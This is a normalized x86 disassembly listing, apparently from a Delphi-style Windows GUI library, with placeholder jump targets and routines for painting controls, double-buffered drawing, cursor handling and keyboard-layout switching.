mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423584
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_424208
call sub_423584
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_424244
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_44d1d4
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_451a9c
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_44a514
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_44e7e8
mov [ esi + 0xc ] eax
mov bl 0x1
sub_451ad0
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_451bf0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_451c28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451bf7
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4182a8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_451c28
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_418304
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_4182a8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416c50
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_4182a8
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_423584
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_416c50
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_423584
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416c50
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_44bf70
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_44e7e8
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_451e58
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_44bf70
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_453e1c
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_453e1c
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_44e7e8
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_44e7e8
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_44bf70
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_451e58
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_4182a8
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_451fac
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_451ad0
jmp r-xdata
mov eax ebx
call sub_450b4c
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4520fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_453e1c
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_44e7e8
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_451fac
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_453e1c
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_45210c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_451a9c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45212c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_451a9c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4521a0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_451a9c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4521c0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_451a9c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4521e0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_451a9c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452204
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_451a9c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452228
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_451a9c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45224c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_451a9c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452270
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_43fdc4
mov edi eax
mov eax edi
call sub_43fea4
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_424244
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_453e1c
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_43ffa4
jmp r-xdata
sub_4522f8
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_44f11c
test bl bl
je r-xdata
mov eax edi
call sub_45412c
mov eax edi
call sub_453d24
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_453d24
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_4523b8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_44ed78
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_452408
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45412c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_4506dc
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403370
sub_452450
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_44d178
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_451708
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d6dc
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46bbc4
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_4525a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_45267f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452686
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_453e1c
mov dl [ ebx + 0x184 ]
call sub_458ac0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46bb3c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407e10
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b93c
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b93c
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b93c
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_45268c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_452716
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45271d
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46bb3c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407e10
test eax eax
je r-xdata
mov eax ebx
call sub_453e1c
mov dl 0x1
call sub_458aa4
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_452778
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_416c40
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_44e7e8
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_4527c8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_4527fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403370
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403370
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45283c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_44e7e8
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_452894
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_420ed0
mov edx [ r-xdata ]
call sub_403324
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_4528cc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4182a8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4528f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_453e1c
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_45294c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_4528b8
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4182a8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_45298c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_405770
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_405770
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_4529f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_452aa0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452aa7
lea eax [ ebp - 0x4 ]
call sub_405758
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_44b2e0
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403174
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405758
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403370
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_405770
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ edi + 0x178 ] eax
sub_452ab0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_4506b4
xor edx edx
push ebp
push sub_452b72
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403370
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452b79
mov eax [ ebp - 0x4 ]
call sub_4506bc
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_452b79
mov eax [ ebp - 0x4 ]
call sub_464dc0
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_44d894
sub_452bc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4030bc
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f4a8
pop esi
pop ebx
